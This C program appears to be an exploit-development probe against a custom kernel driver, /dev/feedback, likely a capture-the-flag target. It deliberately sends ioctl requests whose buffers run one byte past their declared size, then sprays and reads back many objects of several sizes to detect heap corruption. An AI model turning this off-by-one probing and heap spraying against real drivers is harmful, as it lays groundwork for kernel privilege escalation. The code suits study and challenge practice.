#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int do_ioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    int rc = ioctl(fd, cmd, req);
    if (rc < 0) {
        fprintf(stderr, "ioctl(0x%x,id=%llu,size=%llu) = %d errno=%d (%s)\n",
                cmd,
                (unsigned long long)req->id,
                (unsigned long long)req->size,
                rc,
                errno,
                strerror(errno));
    }
    return rc;
}

static int create_feedback(int fd, uint64_t id, uint64_t size, char name_fill, char body_fill, char overflow_byte) {
    char *name = calloc(1, 0x100);
    char *body = calloc(1, size + 1);
    if (!name || !body) {
        perror("calloc");
        exit(1);
    }

    memset(name, name_fill, 0xff);
    memset(body, body_fill, size);
    body[size] = overflow_byte;

    struct request req = {
        .id = id,
        .size = size,
        .name = name,
        .feedback = body,
    };

    int rc = do_ioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_feedback(int fd, uint64_t id, uint64_t size, char *out, size_t out_len) {
    memset(out, 0, out_len);
    struct request req = {
        .id = id,
        .size = 0,
        .name = NULL,
        .feedback = out,
    };
    (void)size;
    return do_ioctl(fd, CMD_READ, &req);
}

static int delete_feedback(int fd, uint64_t id) {
    struct request req = {
        .id = id,
        .size = 0,
        .name = NULL,
        .feedback = NULL,
    };
    return do_ioctl(fd, CMD_DELETE, &req);
}

static void mass_check(int fd, uint64_t base_id, uint64_t size, int count) {
    printf("[+] mass_check size=0x%llx count=%d\n", (unsigned long long)size, count);

    for (int i = 0; i < count; i++) {
        char fill = (char)(0x20 + (i % 90));
        char ov = (char)(0x80 + (i % 70));
        if (create_feedback(fd, base_id + (uint64_t)i, size, 'n', fill, ov) != 0) {
            fprintf(stderr, "create failed at i=%d\n", i);
            break;
        }
    }

    int mismatches = 0;
    char *out = calloc(1, size + 0x20);
    if (!out) {
        perror("calloc out");
        exit(1);
    }

    for (int i = 0; i < count; i++) {
        uint64_t id = base_id + (uint64_t)i;
        char expected = (char)(0x20 + (i % 90));
        if (read_feedback(fd, id, size, out, size + 0x20) != 0) {
            continue;
        }
        if (out[0] != expected) {
            mismatches++;
            printf("[!] mismatch id=%llu expected=0x%02x got=0x%02x\n",
                   (unsigned long long)id,
                   (unsigned char)expected,
                   (unsigned char)out[0]);
        }
    }

    printf("[+] mismatches=%d/%d\n", mismatches, count);
    free(out);

    for (int i = 0; i < count; i++) {
        delete_feedback(fd, base_id + (uint64_t)i);
    }
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open /dev/feedback");
        return 1;
    }

    puts("[+] phase1: overflow reachability checks");
    create_feedback(fd, 100, 0x100, 'N', 'A', 'X');
    create_feedback(fd, 101, 0x180, 'N', 'B', 'Y');
    create_feedback(fd, 102, 0x400, 'N', 'C', 'Z');

    puts("[+] phase2: read-back sanity");
    char out[0x500];
    if (read_feedback(fd, 100, 0x100, out, sizeof(out)) == 0) {
        printf("id=100 first16: ");
        for (int i = 0; i < 16; i++) printf("%02x ", (unsigned char)out[i]);
        printf("\n");
    }
    if (read_feedback(fd, 101, 0x180, out, sizeof(out)) == 0) {
        printf("id=101 first16: ");
        for (int i = 0; i < 16; i++) printf("%02x ", (unsigned char)out[i]);
        printf("\n");
    }

    puts("[+] phase3: cleanup");
    delete_feedback(fd, 100);
    delete_feedback(fd, 101);
    delete_feedback(fd, 102);

    puts("[+] phase4: mass corruption probes");
    mass_check(fd, 1000, 0x40, 96);
    mass_check(fd, 2000, 0x100, 96);
    mass_check(fd, 3000, 0x180, 96);
    mass_check(fd, 4000, 0x400, 64);

    close(fd);
    return 0;
}
